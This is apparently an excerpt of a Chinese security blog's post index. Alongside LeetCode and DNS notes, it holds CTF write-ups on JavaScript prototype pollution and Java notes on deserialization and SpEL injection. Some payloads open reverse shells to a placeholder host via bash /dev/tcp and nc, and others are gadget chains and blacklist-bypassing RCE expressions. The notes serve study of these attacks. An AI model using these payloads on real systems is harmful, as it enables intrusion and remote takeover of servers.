      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> Apache </tag>
            
            <tag> RCE </tag>
            
            <tag> SSI </tag>
            
            <tag> 截断 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一道leetcode-数组题</title>
      <link href="/posts/734660ee/"/>
      <url>/posts/734660ee/</url>
      
        <content type="html"><![CDATA[<h2 id="整数转罗马数字"><a href="#整数转罗马数字" class="headerlink" title="整数转罗马数字"></a>整数转罗马数字</h2><p>题目虽然不难，但是也整了好久，后来才明白转成罗马数字就是不断地做除法和模</p><p>但是我这里遇到了一个问题，python中的字典本来是无序的，所以我就拆成了两个list来存放</p><pre><code class="python">class Solution(object):    def intToRoman(self, num):        &quot;&quot;&quot;        :type num: int        :rtype: str        &quot;&quot;&quot;        result = &#39;&#39;        nums = [1000,900,500,400,100,90,50,40,10,9,5,4,1]        chars = [&#39;M&#39;,&#39;CM&#39;,&#39;D&#39;,&#39;CD&#39;,&#39;C&#39;,&#39;XC&#39;,&#39;L&#39;,&#39;XL&#39;,&#39;X&#39;,&#39;IX&#39;,&#39;V&#39;,&#39;IV&#39;,&#39;I&#39;]        for i in nums:            x = num // i            num = num % i            result += x*chars[nums.index(i)]        return result</code></pre><p>这样当然是没问题得，但是我看到评论区居然有人用python的字典也成功了</p><p>这就很疑惑了，于是我修改了代码：</p><pre><code class="python">class Solution(object):    def intToRoman(self, num):        &quot;&quot;&quot;        :type num: int        :rtype: str        &quot;&quot;&quot;        result = &quot;&quot;        roman = {1000:&#39;M&#39;,900:&#39;CM&#39;, 500:&#39;D&#39;, 400:&#39;CD&#39;, 100:&#39;C&#39;,90:&#39;XC&#39;, 50:&#39;L&#39;, 40: &#39;XL&#39;,10:&#39;X&#39;,9:&#39;IX&#39;, 5:&#39;V&#39;,4:&#39;IV&#39;, 1:&#39;I&#39;}        for i in roman:            x = num // i            num = num % i            result += x*roman[i]        return result</code></pre><p>居然也过了！！！</p><p>难道leetcode的python解释器不一样？</p><p><img src="/posts/734660ee/1580397588462.png" alt></p><h2 id="罗马数字转整数"><a href="#罗马数字转整数" class="headerlink" title="罗马数字转整数"></a>罗马数字转整数</h2><p>这个题目就更妙了，秒就妙在对于哈希表的处理上</p><p>如果是我想的话，只需要将上个题的哈希表倒过来就行了，但是实际上我们可以这样做：</p><pre><code class="python">d = {&#39;I&#39;:1, &#39;IV&#39;:3, &#39;V&#39;:5, &#39;IX&#39;:8, &#39;X&#39;:10, &#39;XL&#39;:30, &#39;L&#39;:50, &#39;XC&#39;:80, &#39;C&#39;:100, &#39;CD&#39;:300, &#39;D&#39;:500, &#39;CM&#39;:800, &#39;M&#39;:1000}</code></pre><p>本来 <code>IV</code> 是代表4的，但是在这里却减去了1，其余的9，40，90都是类似的</p><pre><code class="python">class Solution:    def romanToInt(self, s: str) -&gt; int:        d = {&#39;I&#39;:1, &#39;IV&#39;:3, &#39;V&#39;:5, &#39;IX&#39;:8, &#39;X&#39;:10, &#39;XL&#39;:30, &#39;L&#39;:50, &#39;XC&#39;:80, &#39;C&#39;:100, &#39;CD&#39;:300, &#39;D&#39;:500, &#39;CM&#39;:800, &#39;M&#39;:1000}        result = 0        for i,n in enumerate(s):            a = max(i-1,0)            b = d.get(s[a:i+1], d[n]) # 每次取两个元素，如果有就说明是4，9这类，如果没有就采取默认的 d[n]            result += b        return result</code></pre><p>不得不说这种方法确实很巧妙，甚至可以浓缩为一句话</p><pre><code class="python">return sum(d.get(s[max(i-1, 0):i+1], d[n]) for i, n in enumerate(s))</code></pre><p>不过效率对比上来看，浓缩之后的速度反而变慢了</p><p><img src="/posts/734660ee/1580397813912.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天一个Linux命令-dig</title>
      <link href="/posts/f1616294/"/>
      <url>/posts/f1616294/</url>
      
        <content type="html"><![CDATA[<h2 id="基本选项："><a href="#基本选项：" class="headerlink" title="基本选项："></a>基本选项：</h2><p>@&lt;服务器地址&gt;：指定进行域名解析的域名服务器；<br>-b&lt;ip地址&gt;：当主机具有多个IP地址，指定使用本机的哪个IP地址向域名服务器发送域名查询请求；<br>-f&lt;文件名称&gt;：指定dig以批处理的方式运行，指定的文件中保存着需要批处理查询的DNS任务信息；<br>-P：指定域名服务器所使用端口号；<br>-t&lt;类型&gt;：指定要查询的DNS数据类型；<br>-x&lt;IP地址&gt;：执行逆向域名查询；<br>-4：使用IPv4；<br>-6：使用IPv6；<br>-h：显示指令帮助信息。</p><p>比如我要用Google的DNS</p><p><code>dig prontosil.club @8.8.8.8</code></p><p>查询解析记录<br><code>dig prontosil.club -t CNAME</code></p><p>得到结果：</p><pre><code>;; QUESTION SECTION:;prontosil.club.                        IN      CNAME;; ANSWER SECTION:prontosil.club.         600     IN      CNAME   2zeqwj.coding-pages.com.;; Query time: 55 msec</code></pre><p>查询 TXT 记录</p><p><code>dig _pages-challenge.prontosil.club -t TXT</code></p><p>得到结果：</p><pre><code>;; ANSWER SECTION:_pages-challenge.prontosil.club. 600 IN TXT     &quot;rCAijO55WRowkOABj2JwHDEacVPpxo5rkCtDr2eG7J0=.ItO58cZnxtPdQAIzuUTAumBPxAZ4nwBjsGfmWl/Rhg0=&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> dig </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域名解析记录</title>
      <link href="/posts/b69cd839/"/>
      <url>/posts/b69cd839/</url>
      
        <content type="html"><![CDATA[<h2 id="博客域名解析"><a href="#博客域名解析" class="headerlink" title="博客域名解析"></a>博客域名解析</h2><p>如下是我在腾讯云后台的设置</p><p><img src="/posts/b69cd839/1580398267570.png" alt></p><p>按照腾讯云的解释</p><p><img src="/posts/b69cd839/1580398281271.png" alt></p><p>可以查询到 <a href="http://www.prontosil.club" target="_blank" rel="noopener">www.prontosil.club</a> 的解析记录为</p><p><img src="/posts/b69cd839/1580398293465.png" alt></p><p>经过多次的折腾发现，<code>@</code> 解析记录只能有一个默认，只能有一个记录类型，比如我这里是A记录设置为 <code>@</code>，那么CNAME记录就不能设置为 <code>@</code></p><p>同时我终于发现<code>www</code> 和裸域的区别了，之前还一直以为是同一个</p><h2 id="裸域"><a href="#裸域" class="headerlink" title="裸域"></a>裸域</h2><p>不加 www 的裸域名好处主要是域名更加简短、容易记忆。坏处就多了，讲几个主要的技术原因：<br>裸域名只能绑定 DNS 的 A 记录，不能绑定 CNAME 记录。也就是说你不能把裸域设定为另外域名的别名。很多时候这对管理不是很方便，特别是使用第三方托管服务的时候。如果第三方迁移服务器导致 IP 地址变更，你必须自己去更改 DNS 的 A 记录。</p><h2 id="TXT记录"><a href="#TXT记录" class="headerlink" title="TXT记录"></a>TXT记录</h2><p><img src="/posts/b69cd839/1580398319776.png" alt></p><p>这种可以用来出题</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域名 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript原型链污染</title>
      <link href="/posts/5d5d07b8/"/>
      <url>/posts/5d5d07b8/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h1><h2 id="如何继承"><a href="#如何继承" class="headerlink" title="如何继承"></a>如何继承</h2><p>比如，现在有一个”动物”对象的构造函数。</p><pre><code class="javascript">function Animal(){this.species = &quot;动物&quot;;}</code></pre><p>还有一个”猫”对象的构造函数。</p><pre><code class="JavaScript">function Cat(name,color){　　　　this.name = name;　　　　this.color = color;　　}</code></pre><p>要让<code>Cat</code>这个类去继承<code>Animal</code>类，如果在其他的语言中，一般就是<code>extented</code>即可</p><p>但是在JavaScript中，</p><pre><code class="javascript">Cat.prototype = new Animal();Cat.prototype.constructor = Cat;var cat1 = new Cat(&quot;大毛&quot;,&quot;黄色&quot;);alert(cat1.species); // 动物</code></pre><p>第一行我们直接修改了<code>Cat</code>的<code>prototype</code>属性，让其指向<code>Animal</code></p><p>这一点不难理解，之后所有<code>Cat</code>实例化的对象cat，它的<code>__proto__</code>就会指向<code>Animal</code>(因为<code>Cat.prototype==cat.__proto__</code>)</p><p>但是第二行比较疑惑，<code>Cat.prototype.constructor</code>又代表了什么？</p><p>其实在<code>Cat.prototype</code>中原先是有一个<code>constructor</code>这个属性的，而<code>Cat.prototype.constructor==Cat</code>这个是成立的</p><p>但是我们直接修改了<code>Cat.prototype</code>之后，此时的<code>Cat.prototyep.constructot != Cat</code></p><p>这就比较荒诞了，所以我们要单独修改将这一个属性修改回来</p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><h3 id="redpwnctf2019-blueprint"><a href="#redpwnctf2019-blueprint" class="headerlink" title="redpwnctf2019 blueprint"></a>redpwnctf2019 blueprint</h3><p>题目的简要功能就是能够发表文章，并且选择是否公开，传递的数据是json格式的</p><p>每一个用户有一个<code>user_id</code>，第一次访问的时候会通过<code>makeId</code>函数给一个id</p><p><img src="/posts/5d5d07b8/1572246225198.png" alt></p><p>调试的时候发现每个用户创建的时候会将一个<code>(userId,user)</code>存入到一个map中，<code>userId</code>就是之前生成的，而这个<code>user</code>对象中就有flag，也就是说每一个用户都有一个flag</p><p>生成的<code>user</code>对象</p><p><img src="/posts/5d5d07b8/1572246345905.png" alt></p><p>之后会将请求的内容给<code>merge</code>到<code>parsedBody</code>中</p><p>查看<code>defaultsDeep</code>的例子：</p><pre><code>_.defaultsDeep({ &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39; } }, { &#39;user&#39;: { &#39;name&#39;: &#39;fred&#39;, &#39;age&#39;: 36 } });// =&gt; { &#39;user&#39;: { &#39;name&#39;: &#39;barney&#39;, &#39;age&#39;: 36 } }</code></pre><p>之后就会将<code>parsedBody</code>中的<code>content</code>和<code>public</code>存放到map中</p><p><img src="/posts/5d5d07b8/1572246569945.png" alt></p><p>之后的功能也不难想了，如果<code>pubic</code>为true就会展示在首页上，如果不为true就会不会展示</p><p>而我们之前提到每一个用户其实都是有一个flag的，只是这个<code>public</code>属性没有进行设置而已。</p><p>思路就是通过原型链污染使得flag能被展示出来</p><p>渲染页面的主要部分如下：</p><pre><code class="javascript">blueprints: Object.entries(user.blueprints).map(([k, v]) =&gt; ({  id: k,  content: v.content,  public: v.public,})),</code></pre><p>exp</p><pre><code class="python">import requestsURL = &quot;http://localhost/&quot;user_id = &quot;559eb9b06eb8c581b74f33c1202bff50&quot;res = requests.post(URL+&quot;make&quot;,cookies={&quot;user_id&quot;:user_id},json={&quot;content&quot;:&quot;aaaa&quot;, &quot;public&quot;:&quot;true&quot;,&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;public&quot;:&quot;true&quot;}}})print(res.text)res2 = requests.get(URL, cookies={&quot;user_id&quot;:user_id})print(res2.text)</code></pre><h3 id="新春战疫-ezexpress"><a href="#新春战疫-ezexpress" class="headerlink" title="新春战疫 ezexpress"></a>新春战疫 ezexpress</h3><p>用到了JavaScript的一个小trick</p><p>两个奇特的字符 ==”ı”、”ſ”。==</p><p> 这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。</p><p>绕过之后，就可以登陆,看到一个很显然的 <code>clone</code> 操作</p><pre><code class="js">router.post(&#39;/action&#39;, function (req, res) {  if(req.session.user.user!=&quot;ADMIN&quot;){res.end(&quot;&lt;script&gt;alert(&#39;ADMIN is asked&#39;);history.go(-1);&lt;/script&gt;&quot;)}   req.session.user.data = clone(req.body);  res.end(&quot;&lt;script&gt;alert(&#39;success&#39;);history.go(-1);&lt;/script&gt;&quot;);  });</code></pre><p>那么就可以污染属性了。污染哪个呢？</p><pre><code class="js">router.get(&#39;/&#39;, function (req, res) {  if(!req.session.user){    res.redirect(&#39;/login&#39;);  }  res.outputFunctionName=undefined;  res.render(&#39;index&#39;,data={&#39;user&#39;:req.session.user.user});});router.get(&#39;/info&#39;, function (req, res) {  res.render(&#39;index&#39;,data={&#39;user&#39;:res.outputFunctionName});})</code></pre><p>我们这里就直接污染 <code>res.outputFunctionName</code> </p><p>(测试的时候Windows下无法用nc弹shell)</p><p><img src="/posts/5d5d07b8/1583322699980.png" alt></p><p>然后访问 info 页面即可</p><p>原来的payload</p><pre><code class="json">{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;}}</code></pre><h3 id="HGAME"><a href="#HGAME" class="headerlink" title="HGAME"></a>HGAME</h3><p>这题也是JavaScript原型链污染，不过这里更明显</p><pre><code class="js">if (sekiro.attackInfo.additionalEffect) {    var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)    sekiro = fn(sekiro)}</code></pre><p><code>Function</code> 是动态构造函数</p><p>payload</p><pre><code class="json"> {&quot;solution&quot;:&quot;1&quot;,&quot;__proto__&quot;:{&quot;additionalEffect&quot;:&quot;global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;nc vps-ip port -e /bin/sh&#39;,function(){});&quot;}}</code></pre><p><img src="/posts/5d5d07b8/1583323453485.png" alt></p><p>然后vps上即可监听到请求(当然我这里只是nc一下)</p><p>写到这里突然又想起来了 2019XNUCA的一道JavaScript原型链污染的题目</p><h3 id="2019-XNUCA-hardjs"><a href="#2019-XNUCA-hardjs" class="headerlink" title="2019 XNUCA hardjs"></a>2019 XNUCA hardjs</h3><p>(盗了一张图过来)</p><p>能够RCE的点出在 <code>res.render</code> 处，具体的就不分析了，这里是最后的变量拼接的地方</p><p><img src="/posts/5d5d07b8/j_3.png" alt></p><p>从这里可以看到有两个拼接的变量可以使用</p><p>于是就能够构造两个payload</p><pre><code class="json">{&quot;type&quot;:&quot;wiki&quot;,&quot;content&quot;:{&quot;constructor&quot;: {&quot;prototype&quot;: {&quot;client&quot;: true,&quot;escapeFunction&quot;: &quot;1; return process.env.FLAG&quot;,&quot;debug&quot;:true, &quot;compileDebug&quot;: true}}}}</code></pre><p>或者</p><pre><code class="json"> {    &quot;content&quot;: {        &quot;constructor&quot;: {            &quot;prototype&quot;: {            &quot;outputFunctionName&quot;:&quot;_tmp1;return process.env.FLAG;//;var __tmp2&quot;            }        }    },    &quot;type&quot;: &quot;test&quot;}</code></pre><p>当然要是想弹shell也不是不可以</p><pre><code class="json">{    &quot;content&quot;: {        &quot;constructor&quot;: {            &quot;prototype&quot;: {            &quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/xx 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;            }        }    },    &quot;type&quot;: &quot;test&quot;}</code></pre><p>现在回顾起当时遇到这道题还啥都不会，现在又突然想起来的这种感觉好好玩</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6101#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/6101#toc-1</a></p><p><a href="http://passingfoam.com/2019/08/31/XNUCA-2019-web-复现/" target="_blank" rel="noopener">http://passingfoam.com/2019/08/31/XNUCA-2019-web-%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://xz.aliyun.com/t/6113#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113#toc-5</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java审计笔记</title>
      <link href="/posts/21b61fbe/"/>
      <url>/posts/21b61fbe/</url>
      
        <content type="html"><![CDATA[<h2 id="反射相关概念"><a href="#反射相关概念" class="headerlink" title="反射相关概念"></a>反射相关概念</h2><p>正常执行一条命令</p><pre><code class="java">Runtime.getRuntime().exec(&quot;calc&quot;);</code></pre><p>如果通过反射来执行：</p><pre><code class="java">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);clazz.getMethod(&quot;exec&quot;, String.class).invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(null), &quot;calc&quot;);</code></pre><p><code>Runtime</code> 的构造方法是私有的，遵循单例模式，所以无法直接调用，但是可以通过调用静态方法 <code>getRuntime</code> 来获得一个 <code>Runtime</code> 对象，这个方法是静态的，并不需要传递类的实例进去(不然就陷入了死循环)，而调用之后返回的结果是一个 <code>Runtime</code> 对象，作为 <code>exec</code> 方法的第一个参数，这是因为 <code>exec</code> 方法不是静态方法</p><p>我们正常执行方法是 <code>[1].method([2], [3], [4]...)</code> ，其实在反射里就是 <code>method.invoke([1], [2], [3], [4]...)</code> </p><p>当然如果分解开来比较好理解一点:</p><pre><code class="java">Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);  // 加载 java.lang.Runtime类Method method1 = clazz.getMethod(&quot;getRuntime&quot;);    //获取到getRuntime方法Runtime runtime = (Runtime) method1.invoke(null);  //调用，得到Runtime对象(其实可以直接拿这个对象去调用exec了)//runtime.exec(&quot;calc&quot;) 即可Method method2 = clazz.getMethod(&quot;exec&quot;, String.class); //得到exec方法method2.invoke(runtime, &quot;calc&quot;); //调用exec方法</code></pre><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>java的反序列化是通过<code>ObjectOutputStream</code>和<code>ObjectInputStream</code>两个类来实现的，同时要序列化的类必须实现<code>Serializable</code>接口</p><p>与PHP类似，Java在序列化一个对象的时候会调用<code>writeObject</code>方法，在反序列化一个对象的时候会调用<code>readObject</code>方法</p><h2 id="Apache-CommonsCollections反序列化"><a href="#Apache-CommonsCollections反序列化" class="headerlink" title="Apache CommonsCollections反序列化"></a>Apache CommonsCollections反序列化</h2><p>只要弄懂了反射的逻辑，那么理解 <code>CommonsCollections</code> 的payload也就不难了,重点在构造 <code>transformers</code> 数组的时候</p><pre><code class="java">Transformer[] transformers = new Transformer[]{        new ConstantTransformer(Runtime.class),         new InvokerTransformer(&quot;getMethod&quot;, new Class[]{                String.class, Class[].class}, new Object[]{                &quot;getRuntime&quot;,null}),        new InvokerTransformer(&quot;invoke&quot;, new Class[]{                Object.class, Object[].class}, new Object[]{null,new Object[0]}),        new InvokerTransformer(&quot;exec&quot;, new Class[]{                String.class}, new Object[]{&quot;calc&quot;})};Transformer transformedChain = new ChainedTransformer(transformers);transformedChain.transform(transformers);  //触发</code></pre><p><code>transformers</code> 数组中的每一个对象都会调用一次 <code>transform</code> 函数，<code>ConstantTransformer</code> 直接返回了 <code>Runtime.class</code>  作为下一个 <code>transform</code> 的参数 等价于</p><pre><code>Class clazz = Class.forName(&quot;java.lang.Runtime&quot;);  // 加载 java.lang.Runtime类</code></pre><p>之后 <code>InvokerTransformer</code> 的 <code>transform</code> 接收传过来的 <code>Runtime.class</code> 去调用其 <code>getMethod</code>方法，等价于</p><pre><code>Method method1 = clazz.getMethod(&quot;getRuntime&quot;);    //获取到getRuntime方法</code></pre><p>返回了一个 <code>Method</code>类型的作为下一次 <code>transform</code> 的参数，之后的过程就是分别调用 <code>invoke</code> 和 <code>exec</code> 方法，等价于</p><pre><code>Runtime runtime = (Runtime) method1.invoke(null);  //调用，得到Runtime对象(其实可以直接拿这个对象去调用exec了)runtime.exec(&quot;calc&quot;)</code></pre><p>由于 <code>getRuntime</code> 方法是静态的， <code>invoke</code> 的时候第一个参数不必是类的实例，之后由于已经获取到了 <code>Runtime</code> 的实例就不再需要通过反射去获得 <code>exec</code> 方法再 <code>invoke</code> 了，省去了一点麻烦的步骤</p><p>一开始在分析 <code>InvokerTransformer</code> 的 <code>transform</code> 方法时被绕晕了，还以为是反射的反射，但是如果从函数所起的作用来分析就很明确了</p><p><code>getMethod</code> 和 <code>invoke</code> 方法的原型，所以我们在反射的时候也需要指定这些参数的class</p><pre><code class="java">public Method getMethod(String name, Class&lt;?&gt;... parameterTypes)public Object invoke(Object obj, Object... args)</code></pre><p>但是实际上我们在调用 <code>getMethod</code> 的时候，只需要指定第一个参数为 <code>getRuntime</code> 即可，那么第二个参数我们可以设为 null 或者 <code>new Class[0]</code> ，同理， invoke 方法这里不需要指定参数可以将两个参数都设置为 null</p><p>理解一下 <code>collections.map.TransformedMap</code> 这个类，提供了一个 <code>decorateTransform</code> 方法，可以将普通的map转化为 <code>TransformedMap</code> ，这个函数的原型</p><pre><code class="java">public static Map decorateTransform(Map map, Transformer keyTransformer, Transformer valueTransformer) </code></pre><p>第二个和第三个参数都是 <code>Transformer</code> 类型的，也就是每次更新map的时候，比如对map执行 put操作的时候</p><pre><code class="java">public Object put(Object key, Object value) {    key = transformKey(key);    value = transformValue(value);    return getMap().put(key, value);}</code></pre><p>会针对 key 和 value 执行 transform 操作</p><p>结合之前的 payload, 我们可以编写这个代码弹出计算器</p><pre><code class="java">public class Test {    public static void main(String[] args) {        Transformer[] transformers = new Transformer[]{                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {                        String.class, Class[].class}, new Object[] {                        &quot;getRuntime&quot;, new Class[0]}),                new InvokerTransformer(&quot;invoke&quot;, new Class[] {                        Object.class, Object[].class }, new Object[] {                        null, null }),                new InvokerTransformer(&quot;exec&quot;, new Class[] {                        String.class }, new Object[] {&quot;calc.exe&quot;})};        Transformer transformedChain = new ChainedTransformer(transformers);        Map innerMap = new HashMap();         Map outMap = TransformedMap.decorate(innerMap, null, transformedChain); //转变为 TransformedMap 操作        outMap.put(&quot;key&quot;, &quot;value&quot;);//触发payload    }}</code></pre><p>但是网上给的payload都是针对 <code>setValue</code> 方法触发的payload，这是怎么找到的</p><p>经过调试我发现 <code>AbstractMapEntryDecorator</code> 实现了 <code>Map</code>，其中的  <code>setValue</code> 是这么写的</p><pre><code class="java">public Object setValue(Object object) {    return entry.setValue(object);}</code></pre><p>这个方法之后又被 <code>AbstractInputCheckedMapDecorator</code> 的内部 <code>MapEntry</code> 类重写</p><pre><code class="java">public Object setValue(Object value) {    value = parent.checkSetValue(value); //多了一次 checkSetValue 操作    return entry.setValue(value);}</code></pre><p>这个多出来的 <code>checkSetValue</code> 方法又是 <code>AbstractInputCheckedMapDecorator</code>  的，而 <code>TransformedMap</code> 正是重写了这个方法</p><p><img src="/posts/21b61fbe/1580461320232.png" alt></p><p>所以实际上是的结果是调用了 <code>TransformedMap</code> 的 <code>checkSetValue</code> 方法</p><pre><code class="java">protected Object checkSetValue(Object value) {    return valueTransformer.transform(value);}</code></pre><p>这样就能触发payload了</p><p>之后寻找能够触发 <code>setValue</code> 方法的类，这里利用了 <code>AnnotationInvocationHandler</code></p><p>不过这里似乎只有jdk7才能运行，我开始用的jdk8不能成功</p><p>最后的测试代码</p><pre><code class="java">package com.alibaba.dubbo.demo;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.io.File;import java.io.FileOutputStream;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Retention;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.util.HashMap;import java.util.Map;import javax.management.ObjectInstance;import com.alibaba.dubbo.common.serialize.ObjectInput;/** * @description: 测试 * @author: Pxy * @create: 2020-01-31 16:21 **/public class Test {        public static void main(String[] args) throws Exception {            Transformer[] transformers = new Transformer[]{                    new ConstantTransformer(Runtime.class),                    new InvokerTransformer(&quot;getMethod&quot;, new Class[] {                            String.class, Class[].class}, new Object[] {                            &quot;getRuntime&quot;, new Class[0]}),                    new InvokerTransformer(&quot;invoke&quot;, new Class[] {                            Object.class, Object[].class }, new Object[] {                            null, new Object[0]}),                    new InvokerTransformer(&quot;exec&quot;, new Class[] {                            String.class }, new Object[] {&quot;calc.exe&quot;})};            Transformer transformedChain = new ChainedTransformer(transformers);            Map innerMap = new HashMap();            innerMap.put(&quot;key&quot;, &quot;value&quot;);            Map outMap = TransformedMap.decorate(innerMap, null, transformedChain);            Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);            Constructor ctor = clazz.getDeclaredConstructor(Class.class, Map.class);            ctor.setAccessible(true);            Object instance = ctor.newInstance(Retention.class, outMap);            File f = new File(&quot;payload.bin&quot;);            ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));            out.writeObject(instance);            out.flush();            out.close();            ObjectInputStream input = new ObjectInputStream(new FileInputStream(&quot;payload.bin&quot;));            input.readObject();            input.close();        }}</code></pre><p>先断在这个 <code>AnnotationInvocationHandler</code> 类中</p><p><img src="/posts/21b61fbe/1580469219896.png" alt></p><p>然后触发 <code>checkSetValue</code> 方法</p><p><img src="/posts/21b61fbe/1580469249634.png" alt="1580469249634"></p><p>最后成功弹出计算器</p><h2 id="SPEL表达式注入"><a href="#SPEL表达式注入" class="headerlink" title="SPEL表达式注入"></a>SPEL表达式注入</h2><p>类似于 jinja 表达式，不过更为强大</p><p>编写一个接口进行测试：</p><pre><code class="java">@GetMapping(&quot;/spel&quot;)public String spel(String input) throws  Exception{    SpelExpressionParser parser = new SpelExpressionParser();    Expression expression = (Expression)parser.parseExpression(input);    return expression.getValue().toString();}</code></pre><p>访问 <code>/spel?input=new java.lang.ProcessBuilder(&quot;calc&quot;).start()</code></p><p><img src="/posts/21b61fbe/1580468482834.png" alt></p><h2 id="code-breaking-javacon"><a href="#code-breaking-javacon" class="headerlink" title="code-breaking javacon"></a>code-breaking javacon</h2><p>这道题并不算难，结合了java反射和spel表达式注入</p><p>一个spring框架写的登陆界面，用户名和密码都是admin，有一个remember me可以勾选</p><p><code>application.yml</code>中有一些相关的设置</p><pre><code class="yaml">keywords:  blacklist:     - java.+lang    - Runtime    - exec.*\(user:  username: admin  password: admin  rememberMeKey: c0dehack1nghere1</code></pre><p>有一个黑名单过滤了一些字符，不过可以很容易地用字符串拼接进行绕过</p><p>仔细分析代码，其中有存在一处类似模板渲染的语句</p><pre><code class="java">ParserContext parserContext = new TemplateParserContext();Expression exp = parser.parseExpression(val, parserContext);SmallEvaluationContext evaluationContext = new SmallEvaluationContext();return exp.getValue(evaluationContext).toString();</code></pre><blockquote><p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。</p></blockquote><p>这一处位于<code>getAdvanceValue</code>函数中，调用它的是这里：</p><pre><code class="java">@GetMappingpublic String admin(@CookieValue(value = &quot;remember-me&quot;, required = false) String rememberMeValue,                    HttpSession session,                    Model model) {    if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals(&quot;&quot;)) {        String username = userConfig.decryptRememberMe(rememberMeValue);        if (username != null) {            session.setAttribute(&quot;username&quot;, username);        }    }    Object username = session.getAttribute(&quot;username&quot;);    if(username == null || username.toString().equals(&quot;&quot;)) {        return &quot;redirect:/login&quot;;    }    model.addAttribute(&quot;name&quot;, getAdvanceValue(username.toString()));    return &quot;hello&quot;;}</code></pre><p>这里相当于是admin的管理界面，首先会检查<code>rememberMeValue</code>的值，并且尝试去解密其中的用户名，同时加入到<code>session</code>中，之后执行<code>model.addAttribute(&quot;name&quot;, getAdvanceValue(username.toString()));</code></p><p>那么这里的关键就是<code>cookie</code>中的rememberMeValue，由于我们已经知道了加密的算法和密钥(代码都是直接给的)，那么就可以通过伪造<code>rememberMeValue</code>来达到rce</p><p>首先需要一条java的反射链，因为要绕过一些关键字：</p><pre><code class="java">String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,String.class).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(String.class.getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),&quot;calc&quot;)</code></pre><p>之后要将其构造成Spel表达式，就是增加一个<code>T()</code></p><p>先本地测试弹一个计算器</p><pre><code class="java">System.out.println(Encryptor.encrypt(&quot;c0dehack1nghere1&quot;, &quot;0123456789abcdef&quot;, &quot;#{T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]{\&quot;calc\&quot;})}&quot;)); 